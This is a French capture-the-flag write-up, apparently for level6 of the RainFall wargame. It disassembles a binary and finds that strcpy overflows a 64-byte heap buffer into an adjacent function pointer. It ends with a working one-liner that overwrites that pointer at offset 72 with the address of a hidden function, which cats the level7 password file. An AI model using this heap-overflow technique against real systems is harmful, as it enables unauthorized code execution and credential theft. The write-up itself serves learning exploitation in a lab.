pour ce level le binaire prend un argument et nous renvois "Nope" si on lui met un ou plusieurs arguments.
Cependant si on lui met 0 argument il segfault.

On desassemble le main

[0x080483a0]> pdf @main
            ; DATA XREF from entry0 @ 0x80483b7
┌ 88: int main (char **envp);
│           ; arg char **envp @ ebp+0xc
│           ; var char *src @ esp+0x4
│           ; var void *var_18h @ esp+0x18
│           ; var char *dest @ esp+0x1c
│           0x0804847c      55             push ebp
│           0x0804847d      89e5           mov ebp, esp
│           0x0804847f      83e4f0         and esp, 0xfffffff0
│           0x08048482      83ec20         sub esp, 0x20
│           0x08048485      c70424400000.  mov dword [esp], 0x40       ; '@'
│                                                                      ; [0x40:4]=-1 ; 64 ; size_t size
│           0x0804848c      e8bffeffff     call sym.imp.malloc         ;  void *malloc(size_t size)
│           0x08048491      8944241c       mov dword [dest], eax
│           0x08048495      c70424040000.  mov dword [esp], 4          ; size_t size
│           0x0804849c      e8affeffff     call sym.imp.malloc         ;  void *malloc(size_t size)
│           0x080484a1      89442418       mov dword [var_18h], eax
│           0x080484a5      ba68840408     mov edx, sym.m              ; 0x8048468 ; "U\x89\xe5\x83\xec\x18\xc7\x04$\u0445\x04\b\xe8\xe6\xfe\xff\xff\xc9\xc3U\x89\xe5\x83\xe4\xf0\x83\xec \xc7\x04$@"
│           0x080484aa      8b442418       mov eax, dword [var_18h]
│           0x080484ae      8910           mov dword [eax], edx
│           0x080484b0      8b450c         mov eax, dword [envp]
│           0x080484b3      83c004         add eax, 4
│           0x080484b6      8b00           mov eax, dword [eax]
│           0x080484b8      89c2           mov edx, eax
│           0x080484ba      8b44241c       mov eax, dword [dest]
│           0x080484be      89542404       mov dword [src], edx        ; const char *src
│           0x080484c2      890424         mov dword [esp], eax        ; char *dest
│           0x080484c5      e876feffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
│           0x080484ca      8b442418       mov eax, dword [var_18h]
│           0x080484ce      8b00           mov eax, dword [eax]
│           0x080484d0      ffd0           call eax
│           0x080484d2      c9             leave
└           0x080484d3      c3             ret

on observe que la fonction m est assigne a une variable et plus loin eax est appeller comme une fonction. : disas de m

[0x080483a0]> pdf @sym.m
            ; DATA XREF from main @ 0x80484a5
┌ 20: sym.m ();
│           0x08048468      55             push ebp
│           0x08048469      89e5           mov ebp, esp
│           0x0804846b      83ec18         sub esp, 0x18
│           0x0804846e      c70424d18504.  mov dword [esp], str.Nope   ; [0x80485d1:4]=0x65706f4e ; "Nope" ; const char *s
│           0x08048475      e8e6feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0804847a      c9             leave
└           0x0804847b      c3             ret


Ici on a le Nope

On regarde avec gdb si il y a pas d'autre fonctions

(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f4  _init
0x08048340  strcpy
0x08048340  strcpy@plt
0x08048350  malloc
0x08048350  malloc@plt
0x08048360  puts
0x08048360  puts@plt
0x08048370  system
0x08048370  system@plt
0x08048380  __gmon_start__
0x08048380  __gmon_start__@plt
0x08048390  __libc_start_main
0x08048390  __libc_start_main@plt
0x080483a0  _start
0x080483d0  __do_global_dtors_aux
0x08048430  frame_dummy
0x08048454  n
0x08048468  m
0x0804847c  main
0x080484e0  __libc_csu_init
0x08048550  __libc_csu_fini
0x08048552  __i686.get_pc_thunk.bx
0x08048560  __do_global_ctors_aux
0x0804858c  _fini


Il y a n qui est jamais appeller. On disas avec radare2

[0x080483a0]> pdf @sym.n
┌ 20: sym.n ();
│           0x08048454      55             push ebp
│           0x08048455      89e5           mov ebp, esp
│           0x08048457      83ec18         sub esp, 0x18
│           0x0804845a      c70424b08504.  mov dword [esp], str._bin_cat__home_user_level7_.pass ; [0x80485b0:4]=0x6e69622f ; "/bin/cat /home/user/level7/.pass" ; const char *string
│           0x08048461      e80affffff     call sym.imp.system         ; int system(const char *string)
│           0x08048466      c9             leave
└           0x08048467      c3             ret

La on a notre sesame pour le niveau 7.

Dans le main on observe que strcpy va recuperer en param argv. Cependant argv a ete malloc avec une taille de 64 puisune seconde fois avec 4

On supose donc on va partir de 68 pour pouvoir trouver a partir de quel zone memoire sa segfault

apres quelque test on trouve 72. Donc si le param est = a une lengh de 72 elle segfault.

On suppose donc que ce qui est entre 68 et 72 est un adresse a fournir. Ce qui commence a avoir du sens car on veut
acceder a la fonction n.

On fournis donc l'adresse de n

level6@RainFall:~$ ./level6 $(python -c 'print "o" * 72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d

Ca fonctionne

level6@RainFall:~$ su level7
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7

